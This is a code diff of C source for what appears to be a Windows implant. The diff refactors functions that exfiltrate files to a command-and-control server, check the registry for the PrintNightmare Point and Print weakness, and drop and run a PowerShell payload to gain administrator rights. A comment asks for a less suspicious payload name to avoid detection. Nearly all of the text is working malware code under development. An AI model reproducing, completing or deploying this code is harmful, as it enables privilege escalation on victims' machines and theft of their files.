@@ -5,7 +5,7 @@
 #include <string.h>
 #include <shlwapi.h>
 #include <winspool.h>
-#include <shellapi.h>
+#include <processthreadsapi.h>
 
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "Advapi32.lib")
@@ -83,7 +83,7 @@ DWORD ls(char *path, char* out) {
 
 
 // Reads data from file given by path and sends it back to C2 server
-DWORD exfil(char* path) {
+int exfil(char* path) {
     char abs_path[MAX_PATH] = {0};
     DWORD numBytesRead = 0;
     LARGE_INTEGER fileSize;
@@ -138,52 +138,57 @@ end:
 
 // Checks the registry to see if host is vulnerable to printer nightmare.
 // Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
-DWORD check_registry_for_privesc() {
+// TODO: could refactor with goto + return value variable
+int check_registry_for_privesc() {
+    int vulnerable = 1;
     DWORD status;
-    HKEY hKey;
-    DWORD val;
-    int size = 4; // size of DWORD
+    HKEY hKey = NULL;
+    DWORD val;          // store registry values here 
+    int size = 4;       // size of DWORD, needed for RegGetValue
 
     // Open handle
     status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint", 0, KEY_READ, &hKey);
     if (status == ERROR_FILE_NOT_FOUND) {
-        return 0;
+        vulnerable = 0;
+        goto end;
     }
     if (status != ERROR_SUCCESS) {
-        return -1;
+        vulnerable = -1;
+        goto end;
     }
 
     // Read first value
     status = RegGetValue(hKey, NULL, "RestrictDriverInstallationToAdministrators", RRF_RT_REG_DWORD, NULL, &val, &size);
     if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 0)) {
-        RegCloseKey(hKey);
-        return 0;
+        vulnerable = 0;
+        goto end;
     }
     if (status != ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        return -1;
+        vulnerable = -1;
+        goto end;
     }
 
     // Need to check both registry values
     status = RegGetValue(hKey, NULL, "NoWarningNoElevationOnInstall", RRF_RT_REG_DWORD, NULL, &val, &size);
     if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 1)) {
-        RegCloseKey(hKey);
-        return 0;
+        vulnerable = 0;
+        goto end;
     }
     if (status != ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        return -1;
+        vulnerable = -1;
+        goto end;
     }
 
-    RegCloseKey(hKey);
-    return 1;
+end:
+    if (hKey) { RegCloseKey(hKey); }
+    return vulnerable;
 }
 
 
 // Creates a file in the present working directory and writes the printer nightmare powershell script to it.
 // Returns NULL on failure, and the path to the script on success.
-// TODO: name the payload something less sus than "payload.ps1"
-char* GetPayload() {
+// TODO: name the payload something less sus than "script.ps1"
+char* DownloadScript() {
     char* payload_path;
     char* payload_data;
 
@@ -196,12 +201,13 @@ char* GetPayload() {
     // Allocate buffer for payload data
     payload_data = HeapAlloc(heap, 0, 250*1000); // Allocate 250 Kb to be safe
     if (payload_data == NULL) {
+        HeapFree(heap, 0, payload_path);
         return NULL;
     }
 
     // Create file for payload to be written to
     strcpy(payload_path, pwd);
-    strcat(payload_path, "\\payload.ps1");
+    strcat(payload_path, "\\script.ps1");
     HANDLE hFile = CreateFile(payload_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         HeapFree(heap, 0, payload_data);
@@ -222,52 +228,64 @@ char* GetPayload() {
         return NULL;
     }
 
+    HeapFree(heap, 0, payload_data);
     CloseHandle(hFile);
     return payload_path;
 }
 
 
-// Attempts to gain administrator privileges via the Printer Nightmare CVE
-// TODO: I think the issue is that the powershell script is not being formatted properly
-//       when it is being pulled down. Need to investigate.
+// Attempts to gain administrator privileges via the Printer Nightmare CVE.
+// Works by downloading and executing a powershell script.
 DWORD escalate() {
-    DWORD FLAGS = APD_COPY_ALL_FILES | 0x10 | 0x8000;
-	CHAR dll_path[MAX_PATH];
-	CHAR driver_path[MAX_PATH];
+    char* script_path;
+    STARTUPINFO startInfo;
+    PROCESS_INFORMATION procInfo;
+    DWORD ret = 0;
+
+    // Set up process structures
+    ZeroMemory(&startInfo, sizeof(startInfo));
+    startInfo.cb = sizeof(startInfo);
 
     // Check registry first
     int vulnerable  = check_registry_for_privesc();
     if (vulnerable == 0) {
         c2_send(c2_sock, "Target not vulnerable", 21);
-        return -1;
+        ret = -1;
+        goto end;
     }
     if (vulnerable == -1) {
         c2_send(c2_sock, "ERROR: Could not check registry", 31);
-        // TODO: If there was an error what do we do?
+        ret = -1;
+        goto end;
     }
 
     // Download script
-    char* script_path = GetPayload();
+    script_path = DownloadScript();
     if (script_path == NULL) {
         c2_send(c2_sock, "ERROR: Could not download script", 32);
-        HeapFree(heap, 0, script_path);
-        return -1;
+        ret = -1;
+        goto end;
     }
-    printf("Script path: %s\n", script_path);
+    c2_log("Script path: %s\n", script_path);
 
     // Execute the powershell script
-    INT_PTR res = (INT_PTR) ShellExecute(NULL, "open", "powershell.exe", script_path, NULL, SW_HIDE);
-    if (res <= 32) {
-        printf("script failed to execute\n");
+    DWORD res = CreateProcess(NULL, "powershell.exe -File script.ps1", NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
+    if (!res) {
+        c2_log("Spawning powershell failed\n");
+        ret = -1;
+        goto end;
     }
-    else {
-        printf("script executed I think");
+    WaitForSingleObject(procInfo.hProcess, INFINITE);
+    c2_log("[+] Script ran successfully\n");
+    CloseHandle(procInfo.hProcess);
+    CloseHandle(procInfo.hThread);
+
+end:
+    if (script_path) {
+        DeleteFile(script_path);
+        HeapFree(heap, 0, script_path);
     }
-
-
-
-    HeapFree(heap, 0, script_path);
-    return 0;
+    return ret;
 }
 
 
